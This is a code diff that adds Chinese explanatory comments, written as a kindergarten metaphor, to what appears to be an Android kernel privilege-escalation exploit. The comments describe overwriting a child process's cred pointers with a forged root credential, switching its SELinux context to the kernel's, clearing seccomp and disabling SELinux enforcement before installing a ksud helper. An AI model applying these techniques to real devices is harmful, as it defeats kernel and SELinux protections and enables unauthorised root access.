@@ -1,3 +1,19 @@
+/* ==========================================================================
+ * 【第 4 关】给自己戴上园长徽章 —— 改 cred 提权
+ * ==========================================================================
+ * 万能钥匙(第 3 关)到手后，打开园长的人事档案柜：
+ *
+ *   1. 沿着花名册(init_task 任务链表)逐个翻小朋友的档案，
+ *      按名字("ll_root_child")找到我们派去的小朋友
+ *   2. 把他档案上的身份改成 uid=0/gid=0(园长助手工号)
+ *      —— 实际是把 task_struct 里 cred/real_cred 两个指针指到
+ *      一个"满权限"的假徽章(usage 巨大、capability 全 1)
+ *   3. 顺手把 SELinux 语境(security blob)换成园长自己用的(kernel sid)
+ *   4. 小朋友醒来发现自己已是大管家：setgid(0)/setuid(0) 全过，
+ *      还能写 /sys/fs/selinux/enforce 把"纪律监督员"请去喝茶
+ *
+ * ========================================================================== */
+
 #include "common.h"
 
 int root_child_done;
@@ -36,6 +52,11 @@ pid_t root_child_pid = -1;
 int root_ready_pipe[2] = {-1, -1};
 struct root_shared *root_shared;
 
+/* 【派出提权小朋友】fork 一个叫 "ll_root_child" 的小朋友，
+ * 站在原地等信(go 信号)。主进程用万能钥匙改完他的档案后喊"go"，
+ * 他立刻自报身份：setgid(0)/setuid(0) 试一遍，全成功 = 徽章生效；
+ * 若开了 DISABLE_SELINUX 还顺手把"纪律监督员"调离岗位(enforce=0)；
+ * 提权成功后立即执行第 5 关: install_embedded_ksud() 派小管家安家。 */
 int spawn_root_child(void) {
   int prot = PROT_READ | PROT_WRITE;
   int flags = MAP_SHARED | MAP_ANONYMOUS;
@@ -286,6 +307,11 @@ static int patch_task_seccomp(int fd, uintptr_t task) {
          count_after == 0 && filter_after == 0;
 }
 
+/* 【第 4 关总指挥】按顺序完成戴徽章仪式：
+ * 派小朋友 -> 从花名册头(init_task->tasks 链表)开始翻档案 ->
+ * 按名字找到 ll_root_child -> 改 cred 指针换满权限徽章 ->
+ * 换 SELinux 语境 -> 清 seccomp(把"安全检查员"请去喝茶) ->
+ * 喊 go 让小朋友自验 setuid(0)/setgid(0)。 */
 int install_android_root(int fd) {
   root_uid_before = getuid();
   if (!spawn_root_child()) {
